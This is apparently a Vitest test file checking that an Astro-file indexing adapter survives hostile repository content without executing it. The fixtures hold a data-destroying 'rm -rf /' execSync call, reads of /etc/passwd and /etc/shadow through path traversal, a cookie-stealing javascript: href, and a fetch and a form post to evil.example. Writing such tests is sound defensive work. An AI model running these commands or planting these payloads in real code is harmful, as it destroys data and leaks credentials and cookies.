import { describe, expect, it } from 'vitest';

import { createAstroAdapter } from './astro-adapter.js';
import { splitAstroFile } from './astro-split.js';

import type { IndexingContext, RepositoryFile } from '../types.js';

// PRD §42.5 — repository content is untrusted. A hostile `.astro` file may at worst produce a
// wrong fact; it may never execute code, escape the repository root, or end the run. Astro is
// the one adapter that runs two parsers over one file (ADR-0014), so a failure in either half
// must cost that half at most.

const CONTEXT: IndexingContext = {
  repositorySnapshotId: 'snap-hostile',
  analysisRunId: 'run-hostile',
  createdAt: '2026-08-02T09:00:00.000Z',
};

const CONTROL: RepositoryFile = {
  relativePath: 'src/pages/control.astro',
  content:
    '---\nimport Base from "../layouts/Base.astro";\nconst title = "ok";\n---\n<Base><h1>{title}</h1></Base>\n',
};

const HOSTILE: readonly RepositoryFile[] = [
  {
    // Frontmatter side effects are parsed, never evaluated (PRD §35).
    relativePath: 'src/pages/exec.astro',
    content:
      '---\nconst cp = require("child_process");\ncp.execSync("rm -rf /");\nawait import("/etc/passwd");\n---\n<p>x</p>\n',
  },
  {
    relativePath: 'src/pages/traversal.astro',
    content:
      '---\nimport Evil from "../../../../../../etc/passwd";\n---\n<img src="../../../../etc/shadow" />\n',
  },
  {
    // An opening fence with no closing fence: unknowable, so refused rather than guessed.
    relativePath: 'src/pages/unterminated.astro',
    content: '---\nconst a = 1;\n<h1>hello</h1>\n',
  },
  {
    relativePath: 'src/pages/-looks-like-a-flag.astro',
    content: '---\nconst v = 1;\n---\n<p>{v}</p>\n',
  },
  {
    relativePath: 'src/pages/deep.astro',
    content: `---\nconst x = ${'('.repeat(300)}1${')'.repeat(300)};\n---\n${'<div>'.repeat(200)}${'</div>'.repeat(200)}\n`,
  },
  {
    relativePath: 'src/pages/scripts.astro',
    content:
      '---\n---\n<a href="javascript:alert(document.cookie)">go</a>\n<script>fetch("http://evil.example/steal")</script>\n<form action="//evil.example/post"></form>\n',
  },
  {
    // Broken markup: the html grammar recovers, the adapter reports, the run continues.
    relativePath: 'src/pages/broken.astro',
    content: '---\nconst a = 1;\n---\n<div><span></div></span><<<>\n',
  },
];

describe('Astro adapter against hostile content (PRD §42.5, §34)', () => {
  it('indexes hostile files without throwing and never loses the control file', async () => {
    const fragment = await createAstroAdapter().indexFiles([...HOSTILE, CONTROL], CONTEXT);
    expect(fragment.nodes.some((node) => node.id === `file:${CONTROL.relativePath}`)).toBe(true);
    expect(
      fragment.nodes.some((node) => node.id === `symbol:${CONTROL.relativePath}#control`),
    ).toBe(true);
    for (const file of HOSTILE) {
      const indexed = fragment.nodes.some((node) => node.id === `file:${file.relativePath}`);
      const warned = fragment.warnings.some((warning) => warning.filePath === file.relativePath);
      expect(indexed || warned, `${file.relativePath} produced neither a fact nor a warning`).toBe(
        true,
      );
    }
  });

  it('reports a frontmatter fence that never closes instead of guessing the split', async () => {
    const unterminated = HOSTILE[2] as RepositoryFile;
    const fragment = await createAstroAdapter().indexFiles([unterminated], CONTEXT);
    expect(fragment.warnings.map((warning) => warning.message).join(' ')).toContain('never closed');
    // File-level facts survive; nothing beyond them is invented from an unknowable structure.
    expect(fragment.nodes.map((node) => node.type)).toEqual(['file']);
    expect(fragment.warnings.every((warning) => warning.adapterId === 'astro')).toBe(true);
  });

  it('records a hostile href as data on the template channel and never as a graph edge', async () => {
    const scripts = HOSTILE[5] as RepositoryFile;
    const fragment = await createAstroAdapter().indexFiles([scripts], CONTEXT);
    const hrefs = fragment.callFacts.flatMap((fact) => [...fact.stringArguments]);
    expect(hrefs).toContain('javascript:alert(document.cookie)');
    // A reference is raw material, not a relationship: no edge points anywhere off-repository.
    expect(fragment.edges.every((edge) => String(edge.targetId).startsWith('symbol:'))).toBe(true);
  });

  it('keeps evidence traceable to the half that produced it', async () => {
    const fragment = await createAstroAdapter().indexFiles([CONTROL], CONTEXT);
    const ids = fragment.evidence.map((record) => record.id);
    expect(ids.some((id) => id.includes('astro-frontmatter:'))).toBe(true);
    expect(
      ids.every(
        (id) =>
          id.includes('astro-frontmatter:') ||
          id.includes('astro-template:') ||
          id.startsWith('ev:file-presence:'),
      ),
      ids.join('\n'),
    ).toBe(true);
  });

  it('never lets a split decision depend on anything but the fences', () => {
    // A `---` inside the template is content, not a fence: the split already ended.
    const split = splitAstroFile('---\nconst a = 1;\n---\n<p>---</p>\n---\n');
    expect(split.ok).toBe(true);
    expect(split.ok && split.value.frontmatter?.paddedSource.trim()).toBe('const a = 1;');
  });

  it('produces identical output for the same hostile input twice', async () => {
    const adapter = createAstroAdapter();
    const first = await adapter.indexFiles([...HOSTILE, CONTROL], CONTEXT);
    const second = await adapter.indexFiles([...HOSTILE, CONTROL], CONTEXT);
    expect(JSON.stringify(first)).toBe(JSON.stringify(second));
  });
});
